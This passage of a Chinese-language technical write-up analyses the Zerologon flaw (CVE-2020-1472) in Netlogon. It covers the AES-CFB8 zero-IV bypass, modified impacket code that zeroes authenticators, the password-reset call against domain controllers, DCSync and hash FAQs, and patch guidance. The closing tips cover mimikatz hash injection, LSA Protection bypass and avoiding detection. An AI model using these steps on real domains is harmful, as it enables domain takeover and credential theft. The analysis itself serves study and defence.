+    5）双方对调来验证服务端的 Server credential，如果成功，则说明双方身份认证成功且拥有相同的 SessionKey，后续可采用该密钥进行加密和完整性保护。
+    
+
+这里的计算ClientChallenge使用ComputeNetlogonCredential函数！有两种算法，分别采用DES_ECB和AES_CFB。可以通过协商flag来选择哪一种加密方式。  
+![1651760030_6273db9e1a2b5be58edf0.png!small?1651760060350](https://image.3001.net/images/20220505/1651760030_6273db9e1a2b5be58edf0.png!small?1651760060350)  
+![1651760035_6273dba3ee26bec416299.png!small?1651760071170](https://image.3001.net/images/20220505/1651760035_6273dba3ee26bec416299.png!small?1651760071170)  
+这里存在问题的是AES_CFB8。为了方便理解，我们用一串python代码来表示这个加密过程：
+
+    
+    
+    # Section 3.1.4.4.1
+    def ComputeNetlogonCredentialAES(inputData, Sk):
+        IV='\x00'*16
+        Crypt1 = AES.new(Sk, AES.MODE_CFB, IV)
+        return Crypt1.encrypt(inputData)
+    
+
+使用AES_CFB8，IV是"*16，明文密码是ClientChallenge，key是session_key，计算后的密文是ClientCredential。
+
+这里IV是"*16，我们上面得出一个结论，在AES_CFB8算法中，如果IV为全零。只要我们能控制明文内容为XYXYXYXY这种格式(X和Y可以一样，既每个字节的值都是一样的)，那么一定存在一个key，使得AES_CFB8(XYXYXYXY)=00000000。这里ClientChallenge我们是可以控制的，那么一定就存在一个key，使得ClientCredential为00000000000000：
+
+    
+    
+    1. 向服务端发送一个ClientChallenge00000000000000(只要满足XYXYXYXY这种格式就行)
+    2. 循环向服务端发送ClientCredential为00000000000000，直达出现一个session_key，使得服务端生成的ClientCredential也为00000000000000
+    
+
+**最后还有一个需要注意的环节：**  
+认证的整个协议包里面，默认会增加 **签名校验**
+。这个签名的值是由session_key进行加密的。但是由于我们是通过让服务端生成的ClientCredential也为00000000000000来绕过前面的认证，没有session_key。所以这个签名我们是无法生成的。但是我们是可以取消设置对应的标志位来关闭这个选项的。
+
+在NegotiateFlags中：  
+![1651760042_6273dbaa6bef5198beeae.png!small?1651760071171](https://image.3001.net/images/20220505/1651760042_6273dbaa6bef5198beeae.png!small?1651760071171)  
+  
+所以在方法二中的Poc里面作者将flag位设置为0x212fffff！  
+  
+在NetrServerAuthenticate里面并没有提供传入NegotiateFlags的参数，因此这里我们使用NetrServerAuthenticate3：  
+  
+  
+所以在方法二中的Poc里面作者使用了NetrServerAuthenticate3！
+
+### 4、重置密码利用分析
+
+前面的认证都通过之后，我们就可以利用改漏洞来重置密码，为啥一定是该漏洞？有没有其他的方法？后面会介绍。这里着重介绍重置密码的函数。
+
+在绕过认证之后，我们就可以调用RPC函数了，作者调用的是RPC函数NetrServerPasswordSet2：
+
+    
+    
+    NTSTATUS NetrServerPasswordSet2(
+       [in, unique, string] LOGONSRV_HANDLE PrimaryName,
+       [in, string] wchar_t* AccountName,
+       [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
+       [in, string] wchar_t* ComputerName,
+       [in] PNETLOGON_AUTHENTICATOR Authenticator,
+       [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
+       [in] PNL_TRUST_PASSWORD ClearNewPassword
+     );
+    
+
+调用这个函数需要注意两个地方！
+
+ **1）一个是Authenticator**
+
+如果我们去看NRPC里面的函数，会发现很多函数都需要这个参数。这个参数也是一个校验。在前面的校验通过，建立通道之后，还会校验Authenticator：  
+  
+我们去文档看看Authenticator怎么生成的！  
+  
+这里面我们不可控的参数是是使用ComputeNetlogonCredential计算ClientStoreCredentail+TimeNow，这这里的ComputeNetlogonCredential跟之前一样，之前我们指定了AES_CFB8，这里也就是AES_CFB8。而ClientStoreCredentail的值我们是可控的，TimeNow的值我们也是可控的。我们只要控制其加起来的值跟我们之前指定的ClientChallenge一样(session_key
+跟之前的一样，之前指定的是00000000000000)，就可以使得最后的Authenticator为0000000000000000，最后我们指定Authenticator为0000000000000000就可以绕过Authenticator的校验。
+
+ **2）另外一个是ClearNewPassword**
+
+我们用一段代码来看看他是怎么计算的：
+
+    
+    
+    indata = b'\x00' * (512-len(self.__password)) + self.__password + pack('<L', len(self.__password))
+    request['ClearNewPassword'] = nrpc.ComputeNetlogonCredential(indata, self.sessionKey)
+    
+
+也是使用之前的ComputeNetlogonCredential来计算的。密码结构包含516个字节，最后的4个字节指明了密码长度。前面的512字节是填充值加密码。这里的填充值是''，事实上，这个是任意的。我们只要控制indata的值跟我们之前指定的ClientChallenge一样(session_key
+跟之前的一样，其实也不是完全一样，最后的ClearNewPassword跟之前的ClientCredential长度不一样，所以indata也得是(len(ClearNewPassword)/len(ClientChallenge))*ClientChallenge，之前指定的ClientChallenge为00000000000000，这里也就是'\x00'*516)，就可以使得最后的ClearNewPassword全为0。
+
+## 八、常见问题解析
+
+### 1、DCSync是什么？
+
+DCSync就是利用的这个原理，通过Directory Replication
+Service（DRS）服务的GetNCChanges接口向域控发起数据同步请求。新版本的Mimikatz新增加了DCSync功能。该功能可以模仿一个域控制器，不用登录服务器，就可以远程通过域数据同步复制的方式模仿域控从真实的域控当中请求数据获得想要的用户hash！
+
+### 2、域控获得的hash是什么？
+
+早期SMB协议在网络上传输明文口令。后来出现"LAN Manager
+Challenge/Response"验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。
+
+NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串
+**KGS!@#$%** 。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本
+
+ **简单了解NTLM hash如何计算的：**
+
+    
+    
+    NTLM-Hash的生成
+    用户密码为test123
+    
+    转换成十六进制的格式为74657374313233
+    
+    转换成Unicode格式为7400650073007400310032003300
+    
+    对字符串7400650073007400310032003300以十六进制格式作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1
+    
+
+详细解析文章：
+
+    
+    
+    https://cloud.tencent.com/developer/article/1595069
+    
+
+### 3、hash为什么是分割的？
+
+    
+    
+    其中冒号分割的前半段AAD3B435B51404EEAAD3B435B51404EE是lm hash，后半段111F54A2A4C0FB3D7CD9B19007809AD6是ntlm hash。前半段放到cmd5解密会发现是空密码，那是因为Windows版本的原因。
+    
+
+  
+也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。
+
+### 4、为什么选择$MACHINE.ACC:之后的hash值认定为计算机用户的哈希？
+
+MachineAccount是每台计算机在安装系统后默认生成的计算机帐户。
+
+计算机帐户的密码存储在注册表的位置：
+
+    
+    
+    HKLM\SECURITY\Policy\Secrets\$machine.ACC
+    
+
+如果计算机加入域中，会将计算机帐户的密码同步到域控制器并保存在域控制器的NTDS.dit文件中。
+
+## 九、深度挖掘问题
+
+### 1、为何机器用户修改完密码之后会脱域
+
+dirkjanm大佬在 **https://twitter.com/_dirkjan/status/1306280553281449985**
+已经说的很清楚了。最主要的原因是AD里面存储的机器密码跟本机的Lsass里面存储的密码不一定导致的！接下来将翻译dirkjanm大佬的解答！
+
+正常情况下，AD运行正常时有一个DC和一个服务器。他们彼此信任因为他们有一个共享的Secret（机器帐户密码），他们可以使用它彼此通讯并建立加密通道。两台机器上的共享Secret是相同的：
+
+尝试登录服务器的用户可以通过带有服务票证的Kerberos进行登录。该服务票证由DC使用机器帐户密码加密，服务器具有相同的Secret，可以解密票证（TGT）并知道其合法性，因此利用TGT用户获得访问权限：
+
+所以借助Zerologon攻击，攻击者可以更改AD中计算机帐户的密码，从而在一侧更改Secret。更改后服务器无法再在域上登录，在大多数情况下，服务器仍将具有有效的Kerberos票证，因此某些登录仍将起作用！
+
+用NTLM登录也不行，因为使用AD帐户登录已建立通过安全通道（通过相同的netlogon协议zerologon滥用）在DC上进行了验证，但是无法建立此通道，因为信任中断，并且服务器再次引发错误：  
+![1651760182_6273dc36d6d13b87b775d.png!small?1651760216984](https://image.3001.net/images/20220505/1651760182_6273dc36d6d13b87b775d.png!small?1651760216984)
+
+但是在最常见的特权升级中，就算将DC作为攻击目标置空攻击，它们的密码存储方式有多种都在单个主机上运行，DC也有多个存储凭据的位置，像服务器一样，DC拥有一个带有密码的机器帐户，该帐户以加密方式存储在注册表中，引导时将其加载到lsass.exe中。
+**如果我们使用Zerologon更改密码，则仅AD中的密码会更改，而不是注册表或lsass中的密码。**  
+![1651760157_6273dc1d616af5da565cf.png!small?1651760188116](https://image.3001.net/images/20220505/1651760157_6273dc1d616af5da565cf.png!small?1651760188116)
+
+利用后每当发出新的Kerberos票证时，都会遇到与服务器相同的问题，DC无法使用lsass中的机器帐户密码来解密服务票证，并且无法使用Kerberos中断身份验证！  
+![1651760157_6273dc1d767399b8ca207.png!small?1651760197787](https://image.3001.net/images/20220505/1651760157_6273dc1d767399b8ca207.png!small?1651760197787)
+
+对于NTLM则有所不同。在DC上似乎没有使用计算机帐户，但是通过另一种方式验证了NTLM登录，使得可以使用DC计算机帐户的空NT哈希值进行DCSync读取！
+
+如果您真的想使用Kerberos，我想它可以与2个DC一起使用，DC之间的同步可能会保持一段时间，因为Kerberos票证仍然持续有效。因此一旦将DC1的新密码同步到DC2，就可以使用DC1的帐户与DC1同步！
+
+之所以起作用，是因为DC2的票证已使用DC2机器帐户的kerberos密钥进行了加密，而密钥没有更改！
+
+### 2、脚本里面2000次失败的概率是0.04是怎么算的？
+
+在作者的利用脚本里面，我们注意到这个细节：  
+  
+作者说平均256次能成功，最大的尝试次数是2000次，失败的概率是0.04。那么这个是怎么算出来的呢。
+
+一个基本的概率问题。每一次成功的概率都是1/256，而且每一次之间互不干扰。那么运行N次，至少一次成功的概率就是：
+
+    
+    
+    1-(255/256)**N
+    
+
+那么运行256次成功的概率就是：  
+![1651760182_6273dc36da3583454f4e3.png!small?1651760221627](https://image.3001.net/images/20220505/1651760182_6273dc36da3583454f4e3.png!small?1651760221627)  
+运行2000次成功的概率就是：  
+![1651760182_6273dc36edcd9a9600793.png!small?1651760221628](https://image.3001.net/images/20220505/1651760182_6273dc36edcd9a9600793.png!small?1651760221628)
+
+### 3、NRPC那么多函数，是不是一定得重置密码
+
+已经绕过了netlogon的权限校验，那么netlogon里面的RPC函数那么多，除了重置密码，有没有其他更优雅的函数可以用来利用呢？
+
+我们可以在API文档里面开始寻觅，事实上在impacket里面的impacket/tests/SMB_RPC/test_nrpc.py里面已经基本实现了调用的代码，我们只要小做修改，就可以调用现有的代码来做测试，我们将认证部分，从账号密码登录替换为我们的Poc：
+
+    
+    
+    def connect(self):
+            if self.rpc_con == None:
+                print('Performing authentication attempts...')
+                for attempt in range(0, self.MAX_ATTEMPTS):
+                    self.rpc_con = try_zero_authenticate(self.dc_handle, self.dc_ip, self.target_computer)
+                    if self.rpc_con == None:
+                        print('=', end='', flush=True)
+                    else:
+                        break
+            return self.rpc_con
+    
+
+将Authenticator的实现部分也替换下就行：
+
+    
+    
+    def update_authenticator(self):
+            authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+            # authenticator['Credential'] = nrpc.ComputeNetlogonCredential(self.clientStoredCredential, self.sessionKey)
+            # authenticator['Timestamp'] = 10
+            authenticator['Credential'] = b'\x00' * 8
+            authenticator['Timestamp'] = 0
+            return authenticator
+    
+
+然后其他地方根据报错稍微修改就可以了。我们开始一个个做测试：  
+  
+这块基本是查看信息：  
+  
+虽然可以调用成功，但是对我们的利用帮助不大！  
+  
+这块基本是是建立安全通道的，设置密码已经使用了，除去认证，设置密码，还有一个查看密码。遗憾的是EncryptedNtOwfPassword是使用sesson_key
+参与加密的，我们不知道sesson_key，也就无法解密！  
+  
+其他的函数整体试了下，也没有找到几个比较方便直接提升到域管权限的。大家可以自行寻觅。
+
+事实上，dirkjanm也研究了一种无需重置密码，借助打印机漏洞relay来利用改漏洞的方法，但是由于Rlay在实战中的不方便性，整体来说并不比重置密码好用，这里不详细展开，大家可以自行查看文章：
+
+    
+    
+    different way of abusing Zerologon (CVE-2020-1472)：
+    https://dirkjanm.io/a-different-way-of-abusing-zerologon/
+    
+
+### 4、是不是只有IV 全为零才是危险的
+
+在之前的分析中，只要参与AES运算的上一轮密文每一轮保存不变就行，第一轮的参与AES运算的上一轮密文就是IV。也就是说，存在一个IV，只要他能够保持最前面8位不断移到最后，如AA(XXXXXX)
+->
+(XXXXXX)AA，值保持不变，就一定存在一个key,使得AES_CFB8(XYXYXYXY)=IV*(len(明文)/len(IV))(这里乘以(len(明文)/len(IV)是因为密文长度跟明文一样，不一定跟IV一样)。显然IV
+全为零满足这个条件，但是不止是IV 全为零才有这个安全问题。
+
+### 5、能否举例AES全为0的运算过程情况？
+
+前面已经分析知道AES-CFB8安全性取决于随机选择的IV，但在Netlogon
+RPC中，作为ComputeNetlogonCredential检查的一部分，IV被错误的设置为0。如果IV和client
+challenge为全0的话，那么整个AES运算过程变成：  
+  
+如此一来，通过AES-CFB8加密模式有1/256 概率用8字节全0 明文得到8字节全0密文：  
+  
+通过上述碰撞方法，攻击者可以向域发起Netlogon 计算机账户认证请求, 使用8字节全0 client challenge
+不断尝试得到一个正确的8字节全0 client credential 通过认证，再通过相关调用完成对域控密码的修改，到此小伙伴就非常清晰的了解其底层逻辑了！
+
+## 十、安全防护
+
+### 1、官方升级
+
+目前微软官方已针对受支持的系统版本发布了修复此漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，官方下载链接：
+
+    
+    
+    https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472
+    
+
+**注：**由于网络问题、计算机环境问题等原因，Windows Update的补丁更新可能出现失败。用户在安装补丁后，应及时检查补丁是否成功更新。
+
+右键点击Windows图标，选择“设置(N)”，选择“更新和安全”-“Windows更新”，查看该页面上的提示信息，也可点击“查看更新历史记录”查看历史更新情况。
+
+针对未成功安装的更新，可点击更新名称跳转到微软官方下载页面，建议用户点击该页面上的链接，转到“Microsoft更新目录”网站下载独立程序包并安装。
+
+### 2、其他防护措施
+
+在安装更新补丁后，还可通过部署域控制器 (DC) 强制模式以免受到该漏洞影响，请参考官方文档进行配置：
+
+    
+    
+    《如何管理与 CVE-2020-1472 相关的 Netlogon 安全通道连接的更改》：
+    https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc
+    
+
+## 十一、总结
+
+    
+    
+    1. mimikatz使用起来比zerologon方便快捷，极大的缩短了域控凭证恢复时间，减小对业务的影响以及被发现的可能。
+    
+    2. mimikatz利用过程中第三步dcsync需要域名等信息，且需要当前计算机可以解析域控的IP。当前计算机在域内时使用这种方式比较便捷。建议使用zerologon利用过程的第三步进行替换。
+    
+    3. mimikatz利用过程中第四步hash注入需要具有SeDebugPrivilege权限
+    
+    4. mimikatz利用过程中第四步hash注入在win10环境下需要绕过LSA Protection，该功能需要mimidrv.sys文件，未绕过LSA Protection 时报错！
+    
+
+通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从“Zerologon”漏洞背景、前期漏洞利用条件、详解域控机器用户、CVE-2020-1472三种攻击方法、漏洞分析、常见问题解析、深度挖掘问题分析、安全防护等十个维度对该漏洞进行等等，希望伙伴们能实际操作复现和通读一遍！来巩固自身的渗透技术和技巧！
+
+希望大家提高安全意识，没有网络安全就没有国家安全！
+
+今天基础牢固就到这里，虽然基础，但是必须牢记于心。
+
+作者：大余
+
